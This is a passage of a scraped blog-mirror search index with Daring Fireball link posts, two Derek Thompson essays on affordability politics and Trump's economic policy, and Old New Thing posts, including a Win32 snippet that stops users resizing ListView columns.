Highlighter with Logseq\\n\\n\u6765\u6e90: https://danielwirtz.com\\n\u94fe\u63a5: https://danielwirtz.com/blog/logseq-web-highlighter\\n\u65e5\u671f: Tue, 12 Oct 2021 20:33:00 GMT\\n\\n---\\n\\nA quick tutorial","text":""},{"location":"daringfireball.net/","title":"daringfireball.net","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Apple Reports Record-Breaking Revenue and Profit for Q1 FY26 20260130</li> <li>Lego Group and Crocs Enter Multi-Year Global Partnership 20260130</li> <li>OpenAI\u2019s Codex 20260204</li> <li>Xcode 26.3 \u2018Unlocks the Power of Agentic Coding\u2019 20260204</li> <li>\u2018Backseat Software\u2019 20260129</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"daringfireball.net/Apple%20Reports%20Record-Breaking%20Revenue%20and%20Profit%20for%20Q1%20FY26_20260130/","title":"Apple Reports Record-Breaking Revenue and Profit for Q1 FY26","text":"<p>\u6765\u6e90: daringfireball.net \u53d1\u5e03\u65f6\u95f4: 2026-01-30T19:57:01Z \u94fe\u63a5: https://www.apple.com/newsroom/2026/01/apple-reports-first-quarter-results/</p> <p>{'type': 'text/html', 'language': 'en', 'base': 'https://daringfireball.net/linked/', 'value': '<p>Apple Newsroom, yesterday:</p>\\n\\n\\n  <p>\u201cToday, Apple is proud to report a remarkable, record-breaking\\nquarter, with revenue of $143.8 billion, up 16 percent from a year\\nago and well above our expectations,\u201d said Tim Cook, Apple\u2019s CEO.\\n\u201ciPhone had its best-ever quarter driven by unprecedented demand,\\nwith all-time records across every geographic segment, and\\nServices also achieved an all-time revenue record, up 14 percent\\nfrom a year ago. We are also excited to announce that our\\ninstalled base now has more than 2.5 billion active devices, which\\nis a testament to incredible customer satisfaction for the very\\nbest products and services in the world.\u201d</p>\\n\\n<p>\u201cDuring the December quarter, our record business performance and\\nstrong margins led to EPS growth of 19 percent, setting a new\\nall-time EPS record,\u201d said Kevan Parekh, Apple\u2019s CFO. \u201cThese\\nexceptionally strong results generated nearly $54 billion in\\noperating cash flow, allowing us to return almost $32 billion to\\nshareholders.\u201d</p>\\n\\n\\n<p>John Markoff, writing for The New York Times 20 years ago:</p>\\n\\n\\n  <p>It may not be the last laugh, but on Friday afternoon, after the\\nclose of the stock market, Steven P. Jobs, the chief executive of\\nApple Computer, shared an e-mail chuckle with his employees at the\\nexpense of Dell, a big rival.</p>\\n\\n<p>The message was prompted by the 12 percent surge in Apple\u2019s stock\\nprice last week, which pushed the company\u2019s market capitalization\\nto $72.13 billion, passing Dell\u2019s value of $71.97 billion.</p>\\n\\n<p>In 1997, shortly after Mr. Jobs returned to Apple, the company he\\nhelped start in 1976, Dell\u2019s founder and chairman, Michael S.\\nDell, was asked at a technology conference what might be done to\\nfix Apple, then deeply troubled financially.</p>\\n\\n<p>\u201cWhat would I do?\u201d Mr. Dell said to an audience of several\\nthousand information technology managers. \u201cI\u2019d shut it down and\\ngive the money back to the shareholders.\u201d</p>\\n\\n<p>On Friday, apparently savoring the moment, Mr. Jobs sent a brief\\ne-mail message to Apple employees, which read: \u201cTeam, it turned\\nout that Michael Dell wasn\u2019t perfect at predicting the future.\\nBased on today\u2019s stock market close, Apple is worth more than\\nDell. Stocks go up and down, and things may be different tomorrow,\\nbut I thought it was worth a moment of reflection today. Steve.\u201d</p>\\n\\n\\n<p>Dell\u2019s market cap today: $76 billion. \\nApple\u2019s: $3,824 billion.</p>\\n\\n<p>Upton Sinclair coined the oft-cited maxim \u201cIt is difficult to get a man to understand something, when his salary depends on his not understanding it.\u201d I propose a corollary: It is difficult to get a company to see that certain of its core competencies are in severe decline when the company is making more money than ever.</p>\\n\\n\\n\u00a0\u2605\u00a0\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"daringfireball.net/Lego%20Group%20and%20Crocs%20Enter%20Multi-Year%20Global%20Partnership_20260130/","title":"Lego Group and Crocs Enter Multi-Year Global Partnership","text":"<p>\u6765\u6e90: daringfireball.net \u53d1\u5e03\u65f6\u95f4: 2026-01-30T13:28:54Z \u94fe\u63a5: https://www.lego.com/en-us/aboutus/news/2026/january/the-lego-group-and-crocs-enter-multi-year-global-partnership?locale=en-us</p> <p>{'type': 'text/html', 'language': 'en', 'base': 'https://daringfireball.net/linked/', 'value': '<p>Maybe Trump is right and we should go to war against Denmark.</p>\\n\\n\\n\u00a0\u2605\u00a0\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"daringfireball.net/OpenAI%E2%80%99s%20Codex_20260204/","title":"OpenAI\u2019s Codex","text":"<p>\u6765\u6e90: daringfireball.net \u53d1\u5e03\u65f6\u95f4: 2026-02-04T01:40:24Z \u94fe\u63a5: https://simonwillison.net/2026/Feb/2/introducing-the-codex-app/</p> <p>{'type': 'text/html', 'language': 'en', 'base': 'https://daringfireball.net/linked/', 'value': '<p>Simon Willison:</p>\\n\\n\\n  <p>OpenAI just released a new macOS app for their Codex coding agent. I\u2019ve had a few days of preview access\\u2009\u2014\\u2009it\u2019s a solid app that provides a nice UI over the capabilities of the Codex CLI agent and adds some interesting new features, most notably first-class support for Skills, and Automations for running scheduled tasks.</p>\\n\\n\\n<p>Interesting, for sure. But super-duper interesting? I don\u2019t know.</p>\\n\\n\\n\u00a0\u2605\u00a0\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"daringfireball.net/Xcode%2026.3%20%E2%80%98Unlocks%20the%20Power%20of%20Agentic%20Coding%E2%80%99_20260204/","title":"Xcode 26.3 \u2018Unlocks the Power of Agentic Coding\u2019","text":"<p>\u6765\u6e90: daringfireball.net \u53d1\u5e03\u65f6\u95f4: 2026-02-04T01:34:54Z \u94fe\u63a5: https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</p> <p>{'type': 'text/html', 'language': 'en', 'base': 'https://daringfireball.net/linked/', 'value': '<p>Apple Newsroom:</p>\\n\\n\\n  <p>Xcode 26.3 introduces support for agentic coding, a new way in Xcode for developers to build apps using coding agents such as Anthropic\u2019s Claude Agent and OpenAI\u2019s Codex. With agentic coding, Xcode can work with greater autonomy toward a developer\u2019s goals\\u2009\u2014\\u2009from breaking down tasks to making decisions based on the project architecture and using built-in tools.</p>\\n\\n\\n<p>I don\u2019t know if this is super-duper interesting news, but I think it\u2019s super-duper interesting that Apple saw the need to release this now, not at WWDC in June.</p>\\n\\n\\n\u00a0\u2605\u00a0\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"daringfireball.net/%E2%80%98Backseat%20Software%E2%80%99_20260129/","title":"\u2018Backseat Software\u2019","text":"<p>\u6765\u6e90: daringfireball.net \u53d1\u5e03\u65f6\u95f4: 2026-01-29T21:50:32Z \u94fe\u63a5: https://blog.mikeswanson.com/backseat-software/</p> <p>{'type': 'text/html', 'language': 'en', 'base': 'https://daringfireball.net/linked/', 'value': '<p>Mike Swanson:</p>\\n\\n\\n  <p>What if your car worked like so many apps? You\u2019re driving\\nsomewhere important\u2026maybe running a little bit late. A few\\nminutes into the drive, your car pulls over to the side of the\\nroad and asks:</p>\\n\\n<p>\u201cHow are you enjoying your drive so far?\u201d</p>\\n\\n<p>Annoyed by the interruption, and even more behind schedule, you\\ndismiss the prompt and merge back into traffic.</p>\\n\\n<p>A minute later it does it again.</p>\\n\\n<p>\u201cDid you know I have a new feature? Tap here to learn more.\u201d</p>\\n\\n<p>It blocks your speedometer with an overlay tutorial about the turn\\nsignal. It highlights the wiper controls and refuses to go away\\nuntil you demonstrate mastery.</p>\\n\\n<p>Ridiculous, of course.</p>\\n\\n<p>And yet, this is how a lot of modern software behaves. Not because\\nit\u2019s broken, but because we\u2019ve normalized an interruption model\\nthat would be unacceptable almost anywhere else.</p>\\n\\n<p>I\u2019ve started to think of this as backseat software: the slow\\nshift from software as a tool you operate to software as a channel\\nthat operates on you. Once a product learns it can talk back, it\u2019s\\nremarkably hard to keep it quiet.</p>\\n\\n<p>This post is about how we got here. Not overnight, but slowly. One\\nreasonable step at a time.</p>\\n\\n\\n<p>If that lede pulls you in, like it did for me, you\u2019re going to love the rest of the essay. This is one for the ages. It\u2019s so good.</p>\\n\\n\\n\u00a0\u2605\u00a0\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"derekthompson.org/The%20Affordability%20Curse_20260205/","title":"The Affordability Curse","text":"<p>\u6765\u6e90: https://derekthompson.org \u94fe\u63a5: https://www.theatlantic.com/ideas/2025/11/democrats-cost-of-living-affordability-platform/684847/?utm_source=feed \u65e5\u671f: 2025-11-07T07:30:00-05:00</p> <p>To understand what just happened in this week\u2019s elections\u2014notably Zohran Mamdani\u2019s win in New York City, Mikie Sherrill\u2019s win in New Jersey, and Abigail Spanberger\u2019s win in Virginia\u2014wind back the clock five years.</p> <p>In 2020, Joe Biden won by promising that he could restore normalcy to American life. That did not happen. As the biological emergency of the coronavirus pandemic wound down, the economic emergency (inflation) took off. An affordability crisis broke out around the world. The public revolted. Last year, practically every incumbent party in every developed country lost ground at the ballot box.</p> <p>So it went in the United States. In 2024, Donald Trump won an \u201caffordability election.\u201d I\u2019m calling it that because affordability is what Trump\u2019s voters said they wanted more of. Gallup found that the economy was the only issue that a majority of voters considered \u201cextremely important.\u201d A CBS analysis of exit-poll data found that eight in 10 of those who said they were worse off financially compared with four years ago backed Trump. The AP\u2019s 120,000-respondent VoteCast survey found that voters who cited inflation as their most important factor were almost twice as likely to back Trump.</p> <p>So Trump won. And for the second straight election, the president has violated his mandate to restore normalcy. Elected to be an affordability president, Trump has governed as an authoritarian dilettante. He has raised tariffs without the consultation of Congress, openly threatened comedians who made jokes about him, pardoned billionaires who gave him and his family money, arrested people without due process, overseen the unconstitutional obliteration of the federal-government workforce, and, with the bulldozing of the White House East Wing, provided an admirably vivid metaphor for his general approach to governance, norms, and decorum.</p> <p>[Read: \u2018None of this is good for Republicans\u2019]</p> <p>A recent NBC poll asked voters whether they thought Trump had lived up to their expectations for getting inflation under control and improving the cost of living. Only 30 percent said yes. It was his lowest number for any issue polled. The affordability issue, which seemed to be a rocket exploding upwards 12 months ago, now looks more like a bomb to which the Republican Party finds itself tightly strapped.</p> <p>So again, we have an affordability election on our hands.</p> <p>On the surface, Mamdani, Spanberger, and Sherrill emerged victorious in three very different campaigns. Mamdani defeated an older Democrat in an ocean-blue metropolis. In Virginia, Spanberger crushed a bizarre Republican candidate in a state that was ground zero for DOGE cuts. In New Jersey, Sherrill\u2014whose victory margin was the surprise of the evening\u2014romped in a state that had been sliding toward the Republican column.</p> <p>Despite these cosmetic differences, what unified the three victories was the Democratic candidates\u2019 ability to turn the affordability curse against the sitting president, transforming Republicans\u2019 2024 advantage into a 2025 albatross. Here\u2019s Shane Goldmacher at The New York Times :</p> <p>Democratic victories in New Jersey and Virginia were built on promises to address the sky-high cost of living in those states while blaming Mr. Trump and his allies for all that ails those places. In New York City, the sudden rise of Mayor-elect Zohran Mamdani, the democratic socialist with an ambitious agenda to lower the cost of living, put a punctuation mark on affordability as a political force in 2025.</p> <p>Each candidate arguably got more out of affordability than any other approach. Mamdani\u2019s focus on the cost of living in New York\u2014which included some genuinely brilliant ads on, for example, \u201cHalalflation\u201d and street-vendor permits\u2014has been widely covered. Less ballyhooed, but just as important, is that Spanberger and Sherrill also found that the affordability message had the biggest bang for the buck in their own advertisements. An analysis shared with me by the polling and data firm Blue Rose Research found that \u201cthe best-testing ads in both Virginia and New Jersey focused on affordability, tying rising costs to Trump and Congressional Republicans.\u201d</p> <p>Tuesday night showed what affordability can be for the Democratic Party\u2014not a policy, but a prompt, an opportunity for Democrats to fit different messages under the same tentpole while contributing to a shared national party identity: The president\u2019s a crook, and we care about the cost of living. In New York City, Mamdani won renters by 24 percentage points with a specific promise: freeze the rent. In New Jersey, Sherrill won with a day-one pledge to declare a state of emergency on utility costs, which would allow her to halt rates and delete red tape that holds back energy generation. (The opening line of her mission statement: \u201cLife in New Jersey is too expensive and every single New Jerseyan who pays the bills knows it.\u201d) In Virginia, Spanberger went another way, relentlessly blaming rising costs on Trump.</p> <p>What\u2019s notable is not just what the above messages have in common but what they don\u2019t. Sherrill focused on utility costs, whereas Mamdani focused on rent. Mamdani ran a socialist campaign to energize a young left-wing electorate, whereas Spanberger\u2019s task was to win a purple state with an outgoing Republican governor. Each candidate answered the affordability prompt with a message tailored to the electorate: Affordability is a big tent.</p> <p>The affordability message was especially successful at bringing young voters back to the Democratic fold. After the 2024 election, it looked like young people were listing to the right. Tuesday night was not the ideal test of that theory, because off-year elections tend to have a smaller and more educated (and therefore more naturally anti-Trump) electorate. But the pollster John Della Volpe reported that young voters \u201canchored the Democratic turnaround\u201d in Virginia, where 18-to-29-year-olds delivered a 35-point margin for Spanberger, the largest for Democrats since 2017.</p> <p>It\u2019s easy to understand why young voters would appreciate an emphasis on the cost of living. Just this week, the National Association of Realtors announced that the median age of first-time U.S. homebuyers has jumped to a new record of 40. \u201cZohran\u2019s campaign centered cost-of-living issues, and he at least appeared consistently willing to look for answers wherever they may present themselves,\u201d Daniel Racz, a 23-year-old sport-data analyst who lives in New York, told me. \u201cI think of his mentions of the history of sewer socialism, proposed trial runs of public grocery stores on an experimental basis, and his past free-bus pilot program, which showcased a political curiosity grounded in gathering information to improve his constituents\u2019 lives.\u201d</p> <p>Amanda Litman, a co-founder and the president of Run for Something, oversees a national recruitment effort to help progressives run for downballot office. On Tuesday, the organization had 222 candidates in general elections across the country. \u201cNearly every candidate who won an election for municipal or state legislative office was talking about affordability, especially as it relates to housing,\u201d she told me. \u201cHousing is the No. 1 issue we\u2019ve seen people bring up as a reason to run for office this year.\u201d</p> <p>The affordability approach has several strengths. Because it is a prompt rather than a policy, it allows Democrats to be organized in their thematic positioning but heterodox in their policies. A socialist can run on affordability in a blue city and win with socialist policies; a moderate can run on affordability in a purple state and win with the sort of supply-side reforms for housing and energy that animate the abundance movement. At a time when Democrats are screaming at one another online and off about populism versus moderation, the affordability tent allows them to be diverse yet united: They can run on tying Trump to the affordability crisis while creating messages fit for their respective electorates.</p> <p>[Read: An antidote to shamelessness]</p> <p>This next bit is a little speculative, but another advantage of centering affordability may be that it is easier for members of a political coalition to negotiate on material politics than on post-material politics. Put differently, economic disagreements within a group are more likely to produce debate and even compromise, whereas cultural disagreements are more likely to produce purity tests and excommunication. If a YIMBY left-centrist and a democratic socialist disagree about the correct balance of price controls and supply-side reforms to reduce housing inflation in New York City, that might lead to a perfectly pleasant conversation. But perfectly pleasant conversations between political commentators about, say, ICE deportations or trans women in college sports don\u2019t seem common. If this is true, it would suggest that the spotlight of Democratic attention shifting toward affordability might ameliorate the culture of progressive purity tests in a way that would make for a bigger tent.</p> <p>Affordability politics also poses a distinct challenge. At the national level, Democrats do not have their hands on the price levers, and they won\u2019t for at least four more calendar years. Even if they did, the best ways to reduce prices at the national level include higher interest rates (painful), meaningful spending cuts (excruciating), or a national tax increase (dial 911). Even at the local level, affordability politics in an age of elevated inflation, rapidly growing AI, and complex impediments to affordable housing can easily promise too much\u2014or, to be more exact, offer a set of dangerously falsifiable promises.</p> <p>Affordability politics thrives because of the specificity and clarity of its pledge: Prices are too high; I\u2019ll fix it if you give me power. But politics isn\u2019t just about the words you put on your bumper stickers; it\u2019s about what you do if the bumper stickers work. Building houses takes time, even after reducing barriers to development and improving access to financing. Actually lowering prices can take even longer. Energy inflation is a bear of a problem, with transmission prices rising and data-center construction exploding. After Americans learn whose affordability messages win at the ballot box, they\u2019ll learn whose affordability policies actually work and (perhaps) keep them in office.</p> <p>Affordability is good politics, and a Democratic Party that focuses on affordability at the national level, and supports motley approaches to solving the cost-of-living crisis at the local level, is in a strong position going into 2026. But saying the word affordability over and over doesn\u2019t necessarily guarantee good policy outcomes. In fact, it doesn\u2019t guarantee anything. Which is why at some point on the road back to relevance, the Democratic Party needs to become obsessed with not only winning back power but also governing effectively in the places where they have it.</p> <p>This article was adapted from a post on Derek Thompson\u2019s Substack.</p>"},{"location":"derekthompson.org/The%20Era%20of%20Step-on-a-Rake%20Capitalism_20260205/","title":"The Era of Step-on-a-Rake Capitalism","text":"<p>\u6765\u6e90: https://derekthompson.org \u94fe\u63a5: https://www.theatlantic.com/ideas/archive/2025/09/trump-economic-pain-strategy/684166/?utm_source=feed \u65e5\u671f: 2025-09-11T08:00:00-04:00</p> <p>Sign up for Trump\u2019s Return , a newsletter featuring coverage of the second Trump presidency.</p> <p>Is Donald Trump a staunch capitalist, a secret socialist, a blend of the two, or none of the above? Depending on the day, it\u2019s hard to tell.</p> <p>Some of his initiatives are pure Ronald Reagan, such as his corporate-income tax cuts and deregulation efforts targeted at oil and gas. Some of his interventions would impress a Democratic Socialists of America chapter, such as demanding a public stake in Intel, requesting 15 percent of revenues from Nvidia\u2019s chip sales to China, and securing a \u201cgolden share\u201d of U.S. Steel to retain veto power over its decision making. As for the rest of Trump\u2019s economic policy, it is a hodgepodge of 19th-century mercantilism, developing-world authoritarianism, and extremely online weirdness. The U.S. tariff rate stands near a 100-year high. When Trump isn\u2019t firing the statisticians who calculate unemployment, he\u2019s waging war against the independent central bank or posting about the fierce urgency of corporate-logo design.</p> <p>To put it simply, or at least as simply as one can: Trump\u2019s economic agenda is deeply Reaganite and deeply anti-conservative; somewhat capitalist and frequently socialist; declaratively obsessed with \u201cAmerican greatness\u201d yet constantly sidetracked by online outrages that do nothing for the country.</p> <p>So, what is Trumponomics?</p> <p>[From the April 2025 issue: The real goal of the Trump economy]</p> <p>The most interesting answer I\u2019ve heard is \u201cstate capitalism with American characteristics,\u201d which The Wall Street Journal \u2019s Greg Ip defined as \u201ca hybrid between socialism and capitalism in which the state guides the decisions of nominally private enterprises.\u201d This diagnosis makes Trump\u2019s economic policy seem more evolutionary than revolutionary. In the past 70 years, the U.S. government has frequently intervened in corporate affairs, especially in response to emergencies such as World War II (the Defense Production Act), the Great Recession (the bank bailouts), and COVID (the Paycheck Protection Program). Under Joe Biden, Democrats waded into industrial policy with subsidies for clean energy and semiconductors. By one interpretation, Trumponomics doesn\u2019t stand out in history; it\u2019s just the latest example of the federal government taking a more activist role in directing the economy, especially as we try to compete with the juggernaut of authoritarian China, whose modern development was known as \u201csocialism with Chinese characteristics.\u201d</p> <p>But Trumponomics is too erratic to deserve any comparison with state capitalism, especially in relation to China. As the author Dan Wang writes in his new book, Breakneck , China is an \u201cengineering state,\u201d where Beijing\u2019s control over the economy both emerges from long-term planning and radiates outward through millions of local-government representatives. \u201cThe core characteristic of China\u2019s state capitalism is discipline,\u201d Wang told Ip. \u201cTrump is the complete opposite of that.\u201d</p> <p>Consider, for example, two simple questions: What are Trump\u2019s tariffs supposed to accomplish, and what are they actually accomplishing? The White House, including the economic adviser Stephen Miran, has repeatedly stressed that higher import taxes will bring back manufacturing and revitalize exports. Neither is happening. Manufacturing output has declined every month since the tariffs were announced, and many firms have explicitly blamed Trump\u2019s tariffs. Meanwhile, the president recently struck a deal requiring Nvidia and AMD to pay the government 15 percent of revenue on the sale of AI chips to China. The logic is genuinely hard to follow on a week-to-week basis. Promoting exports with global tariffs (which might be illegal) is one thing. Taxing exports (which might also be illegal) is another thing. But taxing imports and exports simultaneously doesn\u2019t really comport with any coherent economic strategy. As the economy lists toward stagflation, the White House is not doing \u201cstate capitalism\u201d so much as it\u2019s doing \u201cstep-on-a-rake capitalism\u201d\u2014a tragicomic bungling of economic growth that fails to advance the very objectives it claims to prioritize.</p> <p>The problem with evaluating this administration\u2019s economic agenda is that Trumponomics is about Trump far more than it is about economics. There is no clear theory of growth steering the U.S. economy, just one man\u2019s desire to colonize every square inch of American attention and experience, which happens to include international markets.</p> <p>Trumponomics, then, is best understood as Trump\u2019s formula for controlling everything around him, rather than an ideology with a telos. That formula has three main components. The first is declaring an emergency to justify intervention. The second is making threats to force private actors to do his bidding. The third is demanding tribute.</p> <p>All presidents have the power to declare emergencies. None has used this power as frequently as Donald Trump.</p> <p>Since 1981, the typical president has declared about seven national emergencies in each four-year term. In the first six months of his second term, Trump has already declared nine, plus a \u201ccrime emergency\u201d in Washington. He\u2019s invoked the Alien Enemies Act of 1798 to deport foreigners during a war or invasion, Title X to deploy the National Guard in various cities, and other congressional acts to expedite mining on federal lands. \u201cEven when Trump doesn\u2019t declare a legal emergency, he describes crises that justify dramatic action,\u201d The New York Times \u2019 Adam Kushner wrote. At this rate, Trump is on pace to announce 70 emergencies in this administration, which would nearly match the total number of emergencies announced from 1980 to 2025, according to the Brennan Center for Justice.</p> <p>Emergency declarations have been core to Trump\u2019s economic agenda. Tariffs, the most significant policy initiative of Trump\u2019s current term, kicked off with an emergency declaration. On February 3, the White House announced its first round of tariffs on Canada, Mexico, and China. Although import taxes are typically the domain of the legislature, Trump as president claimed the authority to tax imports under the International Emergency Economic Powers Act, or IEEPA, because of these countries\u2019 alleged failure to stop the flow of migrants and fentanyl.</p> <p>The IEEPA is a 1977 law that allows the president to impose financial regulations, such as sanctions or export restrictions, during a national emergency. But no president before Trump ever used IEEPA to tax imported goods. In August, a federal court of appeals struck down the tariffs as unconstitutional, pointing out that IEEPA gives the executive branch authority to regulate imports but not to tax them. Now that net immigration has plummeted to historic lows, it doesn\u2019t even make sense to claim the power to tax imports based on an alleged migration emergency that has, by all accounts, ended. But the White House has said it will fight for the right to impose tariffs all the way to the Supreme Court.</p> <p>I have said before that the No. 1 rule for understanding Trump is that \u201ca lot happens under this administration, but a lot un-happens, too.\u201d This also is a function of Trump\u2019s \u201ceverything is an emergency\u201d style of governance\u2014constantly bending the law into unnatural shapes to justify whatever action the president seeks in the moment.</p> <p>Just as Trump depends on emergency declarations, he also depends on threats. The president creates pain, then demands tribute, at which point he removes the pain.</p> <p>To punish ABC for its negative coverage, Trump threatened to revoke its broadcast license, accepted a $16 million financial tribute from the Walt Disney Company, and then backed down. To punish law firms for litigation against him or his allies, Trump threatened several firms with limited access to government contracts before accepting hundreds of millions of dollars in promised pro bono services to Trump-approved causes. To punish Columbia University for a litany of perceived sins, including its DEI policies, Trump froze hundreds of millions of dollars in federal research funding before the university agreed to pay a large tribute and change its policies.</p> <p>Trump applies the same pain-tribute method to direct international trade and private-firm behavior. In the spring, Trump threatened new tariffs on Japanese and European Union exports. (Pain created.) In response, Japan and the EU agreed to invest more than $1 trillion in the U.S., and Trump himself claimed the authority to direct some of the investment to his favored causes. (Tribute offered.) Then Trump cut both tariff rates by about half. (Pain removed.) Last month, Trump called for Lip-Bu Tan to resign as the chief executive of Intel. (Pain created.) Days later, Tan met with Trump at the White House to work out a deal, and when they emerged, the U.S. government owned 10 percent of his company. (Tribute offered.) Tan remains the CEO of Intel. (Pain removed.)</p> <p>In the aftermath of any one of these events, you might come up with a philosophical justification. You could defend high tariffs because they raise revenue, or you could defend reduced tariffs because they increase the flow of trade among allies. You could defend firing Tan for his alleged Chinese connections and poor performance, or you could defend retaining Tan as long as the U.S. gets a slice of Intel. But you can\u2019t defend all of these opinions at the same time. Each one represents a specific ideological position, and Trumponomics\u2014outside of a basic distrust of trade and fondness for tariffs\u2014is mostly beyond any ideology. The president\u2019s personalist style of politics is optimally designed not to achieve any specific policy outcome but rather to achieve the vanquishing of a counterparty. Tariffs, insults, threats, and Truth Social posts perform a similar function: They create leverage that Trump can use to claim victory, tribute, or both.</p> <p>Trump\u2019s personalist style of politics thrusts America back to the late 19th century and the Gilded Age, when corruption was so rampant that it was broadly considered the cost of doing business. The intercontinental railroads depended on insider trading and stock manipulation, as the historian Richard White has said. Andrew Carnegie illegally supplied information to politicians in exchange for their protection of his steel monopoly. The big industrialists in rail, oil, and steel would promise congressmen and senators jobs after leaving office if they did the companies\u2019 bidding.</p> <p>[Annie Lowrey: Trump is a degrowther]</p> <p>Corruption oozes out of this White House as well. In his first six months in office, Trump accepted a luxury jet as a gift from Qatar and solicited family-business investments from several Arab states; countries around the world are now racing to build Trump golf courses and towers in a rather transparent bid for his approval. When a crypto mogul under fraud investigation bought $75 million in Trump-backed tokens, the SEC paused his civil case, citing the \u201cpublic\u2019s interest.\u201d</p> <p>I can imagine a Trump supporter who has somehow made it this far into the essay thinking: You just don\u2019t get it. The Chinese are eating our lunch. They\u2019re not just catching up on AI. They make two-thirds of the world\u2019s electric vehicles, more than three-quarters of its electric batteries, 80 percent of its consumer drones, and 90 percent of its solar panels. They make 13 times more steel than the U.S. and build naval ships several orders of magnitude faster than we do. We need a big, rude state-capitalist authoritarian to stand up to the state-capitalist authoritarian that is China.</p> <p>My response to this is: Okay, maybe, but show me any evidence that, given the choice between helping the U.S. against China or helping himself, Trump will actually choose the former? In his first term, Trump insisted that Congress force TikTok to sell itself to a non-Chinese company. In fact, I\u2019d agree that the largest news source for Gen Z probably shouldn\u2019t have an intimate legal entanglement with the Chinese Communist Party. Acting under this logic, House Republicans under Biden voted 186\u201325 to force a TikTok sale. But after meeting with an investor in ByteDance, the parent company of TikTok, Trump reversed course and has used his executive power to delay the very TikTok sale that (a) he called for and that (b) Congress has legally mandated.</p> <p>There is no secret plan to help America sell more stuff. If anything, it is American policy itself that has been put up for sale.</p>"},{"location":"devblogs.microsoft.com/oldnewthing/","title":"devblogs.microsoft.com/oldnewthing","text":"<p>Practical development throughout the evolution of Windows.</p> <p>\u7f51\u7ad9: https://devblogs.microsoft.com/oldnewthing RSS: https://devblogs.microsoft.com/oldnewthing/feed</p>"},{"location":"devblogs.microsoft.com/oldnewthing/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Super Bowl LX creates an opportunity for symphonic friendly wagering_20260205</li> <li>How can I prevent the user from changing the widths of ListView columns-_20260205</li> <li>Some small stories about the giant satellite dish antenna that was behind Microsoft Building 11_20260205</li> <li>Studying compiler error messages closely- Input file paths_20260205</li> <li>Why not store the SAFEARRAY reference count as a hidden allocation next to the SAFEARRAY-_20260205</li> </ul>"},{"location":"devblogs.microsoft.com/oldnewthing/How%20can%20I%20prevent%20the%20user%20from%20changing%20the%20widths%20of%20ListView%20columns-_20260204/","title":"How can I prevent the user from changing the widths of ListView columns?","text":"<p>\u6765\u6e90: devblogs.microsoft.com/oldnewthing \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 15:00:00 +0000 \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260204-00/?p=112037</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Suppose you are using a Win32 ListView control in report mode, and you\u2019ve got all your columns set up perfectly, and you don\u2019t want the user to resize them. How do you do that? \\n There is no ListView style for preventing column resize, but there is a header control style to prevent sizing: HDS_NOSIZING . This style requires Common Controls version 6, but I\u2019m sure you\u2019re all using that version already, right? \\n auto hdr = ListView_GetHeader(hwndLV);\\nSetWindowLong(hdr, GWL_STYLE,\\n              GetWindowLong(hdr, GWL_STYLE) | HDS_NOSIZING);\\n \\n Whether the columns can be resized is independent of whether the columns can be rearranged, which you specify by setting the LVS_EX_HEADER\\xadDRAG\\xadDROP ListView extended style. \\n ListView_SetExtendedListViewStyleEx(hwndLV,\\n                                    LVS_EX_HEADERDRAGDROP,\\n                                    LVS_EX_HEADERDRAGDROP);\\n \\n Okay, but what if you\u2019re stuck in the dark ages with version 5 of the Common Controls? We\u2019ll look at that next time. \\n The post How can I prevent the user from changing the widths of ListView columns? appeared first on The Old New Thing . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:33</p>"},{"location":"devblogs.microsoft.com/oldnewthing/How%20can%20I%20prevent%20the%20user%20from%20changing%20the%20widths%20of%20ListView%20columns-_20260205/","title":"How can I prevent the user from changing the widths of ListView columns?","text":"<p>\u6765\u6e90: https://devblogs.microsoft.com/oldnewthing \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260204-00/?p=112037 \u65e5\u671f: Wed, 04 Feb 2026 15:00:00 +0000</p> <p>Suppose you are using a Win32 ListView control in report mode, and you've got all your columns set up perfectly, and you don't want the user to resize them. How do you do that?</p> <p>There is no ListView style for preventing column resize, but there is a header control style to prevent sizing: <code>HDS_NOSIZING</code>. This style requires Common Controls version 6, but I'm sure you're all using that version already, right?</p> <pre><code>auto hdr = ListView_GetHeader(hwndLV);\nSetWindowLong(hdr, GWL_STYLE,\n              GetWindowLong(hdr, GWL_STYLE) | HDS_NOSIZING);\n</code></pre> <p>Whether the columns can be resized is independent of whether the columns can be rearranged, which you specify by setting the <code>LVS_EX_HEADER\u00adDRAG\u00adDROP</code> ListView extended style.</p> <pre><code>ListView_SetExtendedListViewStyleEx(hwndLV,\n                                    LVS_EX_HEADERDRAGDROP,\n                                    LVS_EX_HEADERDRAGDROP);\n</code></pre> <p>Okay, but what if you're stuck in the dark ages with version 5 of the Common Controls? We'll look at that next time.</p> <p>The post How can I prevent the user from changing the widths of ListView columns? appeared first on The Old New Thing.</p>"},{"location":"devblogs.microsoft.com/oldnewthing/Some%20small%20stories%20about%20the%20giant%20satellite%20dish%20antenna%20that%20was%20behind%20Microsoft%20Building%2011_20260203/","title":"Some small stories about the giant satellite dish antenna that was behind Microsoft Building 11","text":"<p>\u6765\u6e90: devblogs.microsoft.com/oldnewthing \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 15:00:00 +0000 \u94fe\u63a5: https://devblogs.microsoft.com/oldnewthing/20260203-00/?p=112035</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Back in the day, if you wandered into the parking area behind Building 11 on the original Redmond Microsoft campus, you would find a very large satellite dish antenna. This antenna was used for receiving video signals, such as cable television feeds for 